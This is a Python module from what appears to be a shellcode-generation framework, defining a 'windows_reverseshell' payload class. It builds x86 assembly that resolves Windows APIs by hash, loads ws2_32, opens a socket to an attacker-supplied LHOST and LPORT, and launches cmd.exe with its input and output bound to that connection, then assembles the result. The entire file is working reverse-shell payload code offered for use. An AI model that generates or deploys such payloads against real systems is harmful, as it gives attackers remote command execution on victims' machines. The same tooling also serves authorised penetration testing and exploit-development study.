from payloads.Engine import Winx86Engine

import socket
import struct

class WinReverseshell(Winx86Engine):

	def __init__(self, output="a", template=None):
		super().__init__()

		self.info = {
		'Name':'windows_reverseshell',
		'Description':'Spawns a reverse shell',
		'Args':'LHOST, LPORT',
		'Author':'Simone Cardona'
		}

		self.template = template
		self.output = output

	def windows_reverseshell(self, *args):
		self.args = args
		(LHOST, LPORT) = self.parseOptions()
		exit = super().parseExit()

		# LoadLibraryA
		self.hash.append("0xec0e4e8e")
		self.calls.append("[ebp+0x04]")
		# CreateProcessA
		self.hash.append("0x16b3fe72")
		self.calls.append("[ebp+0x08]")

		super().header()
		super().mainFunction()

		self.payload += super().zeroingRegister("eax") + "\n"
		self.payload += "mov ax,0x3233\n"
		self.payload += "push eax\n"
		self.payload += "push 0x5f327377\n"
		self.payload += "push esp\n"
		self.payload += "call %s\n" % self.calls[0]
		self.payload += "mov edi,eax\n"

		# WSAStartup
		self.hash.append("0x3bfcedcb")
		self.calls.append("[ebp+0x0c]")
		super().call_findFunction(self.hash[2])

		self.payload += super().zeroingRegister("ebx") + "\n"
		self.payload += "mov bx,0x0190\n"
		self.payload += "sub esp,ebx\n"
		self.payload += "push esp\n"
		self.payload += "push ebx\n"
		self.payload += "call %s\n" % self.calls[2]

		# WSASocketA
		self.hash.append("0xadf509d9")
		self.calls.append("[ebp+0x10]")
		super().call_findFunction(self.hash[3])

		self.payload += super().zeroingRegister("ebx") +"\n"
		self.payload += "push ebx\n" * 3
		self.payload += super().zeroingRegister("ecx") + "\n"
		self.payload += "mov cl,6\n"
		self.payload += "push ecx\n"
		self.payload += "inc ebx\n"
		self.payload += "push ebx\n"
		self.payload += "inc ebx\n"
		self.payload += "push ebx\n"
		self.payload += "call %s\n" % self.calls[3]

		self.payload += "xchg eax, esi\n"

		# connect
		self.hash.append("0x60aaf9ec")
		self.calls.append("[ebp+0x14]")
		super().call_findFunction(self.hash[4])

		self.payload += "push dword %s\n" % LHOST
		self.payload += "push word %s\n" % LPORT
		self.payload += super().zeroingRegister("ebx") + "\n"
		self.payload += "add bl,0x2\n"
		self.payload += "push word bx\n"
		self.payload += "mov edx,esp\n"
		self.payload += "push byte 0x16\n"
		self.payload += "push edx\n"
		self.payload += "push esi\n"
		self.payload += "call %s\n" % self.calls[4]

		self.payload += "mov edx, 0x646d6363\n"
		self.payload += "shr edx, 8\n"
		self.payload += "push edx\n"
		self.payload += "mov ecx, esp\n"
		self.payload += super().zeroingRegister("edx") + "\n"
		self.payload += "sub esp, 16\n"
		self.payload += "mov ebx, esp\n"

		self.payload += "push esi\n" * 3
		self.payload += "push edx\n" * 2
		self.payload += super().zeroingRegister("eax") + "\n"
		self.payload += "inc eax\n"
		self.payload += "rol eax, 8\n"
		self.payload += "inc eax\n"
		self.payload += "push eax\n"
		self.payload += "push edx\n" * 10
		self.payload += super().zeroingRegister("eax") + "\n"
		self.payload += "add al, 44\n"
		self.payload += "push eax\n"
		self.payload += "mov eax, esp\n"
		self.payload += "push ebx\n"
		self.payload += "push eax\n"
		self.payload += "push edx\n" * 3
		self.payload += super().zeroingRegister("eax") + "\n"
		self.payload += "inc eax\n"
		self.payload += "push eax\n"
		self.payload += "push edx\n" * 2
		self.payload += "push ecx\n"
		self.payload += "push edx\n"
		self.payload += "call %s\n" % self.calls[1]

		if exit != None:
			self.payload += "jmp ending\n"
		else:
			# ExitProcess
			self.hash.append("0x73e2d87e")
			self.calls.append("[ebp+0x18]")

			self.payload += "mov edi, [ebp]\n"
			super().call_findFunction(self.hash[5])
			self.payload += super().zeroingRegister("ecx") + "\n"
			self.payload += "push ecx\n"
			self.payload += "call %s\n" % self.calls[5]

		super().kernel32Base()
		super().findFunction(self.kernel32)
		super().footer()

		super().assemble(self.output)

	def parseOptions(self):
		lhost = ""
		lport = ""
		for arg in self.args:
			for a in arg:
				if "LHOST" in a:
					lhost = a.split("=")[1]
				if "LPORT" in a:
					lport = a.split("=")[1]
		lhost = lhost.split(".")
		encoded = b''
		for i in lhost:
			if len(i) == 1 or int(i,16) == 16:
				encoded += struct.pack('B',int(i,10))
				encoded += struct.pack('B',int('0',10))
			else:
				encoded += struct.pack('B',int(i,10) )
		encoded = encoded.decode("unicode-escape")
		encoded = ''.join(reversed(encoded))
		tmp = encoded
		res = []
		encoded = encoded.encode("latin1")
		for i in bytearray(encoded):
			res.append(hex(i))
		encoded = '0x'
		encoded += tmp
		    
		encoded = ''
		for i in res:
			encoded += i

		encoded = encoded.replace("0x","")
		tmp = encoded
		encoded = '0x'
		encoded += tmp

		lport = socket.htons(int(lport,10))

		return (encoded, lport)